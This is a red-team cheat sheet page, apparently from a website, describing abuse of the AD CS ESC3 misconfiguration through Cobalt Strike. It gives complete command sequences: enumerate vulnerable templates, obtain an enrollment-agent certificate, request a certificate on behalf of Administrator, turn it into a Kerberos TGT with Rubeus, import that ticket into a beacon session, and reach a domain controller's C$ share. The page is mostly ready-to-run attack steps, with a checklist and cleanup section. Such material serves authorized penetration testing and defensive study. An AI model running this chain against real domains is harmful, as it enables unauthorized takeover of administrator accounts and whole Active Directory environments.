---
title: "AD CS ESC3 \u00b7 Enrollment Agent Abuse"
description: "Request a Certificate Request Agent certificate, use it for accepted on-behalf-of enrollment, and verify the final target certificate and Kerberos ticket."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Rubeus", "Kerbeus BOF"]
updated: "2026-11-16"
tags: ["adcs", "esc3"]
draft: false
---

## 1. Why the attack works

An enrollment-agent certificate can sign certificate requests on behalf of another account. ESC3 becomes exploitable when the requester can obtain that agent certificate and a target template/CA accepts its on-behalf-of request for the intended identity.

| Stage | Certificate |
|---|---|
| Initial enrollment | Agent certificate for the controlled account |
| On-behalf-of request | Target-account certificate issued using the agent |
| PKINIT | Authenticate with the final target-account PFX |

Check agent EKU `1.3.6.1.4.1.311.20.2.1`, enrollment rights, issuance requirements, CA enrollment-agent restrictions and the target template's signature policies. Merely finding the agent EKU is insufficient.

## 2. Request the agent certificate

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
# Retain the controlled account's agent PFX.
```

## 3. Request on behalf of the target

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx <AGENT_PFX_BASE64> --quiet
# Record the new request ID and target-account PFX.
```

Use the final PFX for authentication. Importing the agent certificate instead will not by itself produce an Administrator TGT. Confirm that the resulting certificate maps to the intended account.

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:<TARGET_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
```

Confirm the ticket client is `Administrator` and its service is `krbtgt/CONTOSO.COM`. Select one import path. Then verify an operation that the represented account is authorized to perform.

```shell
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## Troubleshooting

| Symptom | Check |
|---|---|
| On-behalf-of enrollment rejected | Agent certificate, authorized signatures, target template and CA agent restrictions |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Validate agent EKU, enrollment and agent-certificate issuance requirements.
[ ] Identify a published target template accepting on-behalf-of requests.
[ ] Check CA agent restrictions and the requested target account.
[ ] Obtain the agent PFX, then use request-agent for the target.
[ ] Record both request IDs and retain the final target PFX.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
```

## Related references

- [ESC2 broad certificate usages](/cheatsheets/adcs-esc2-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
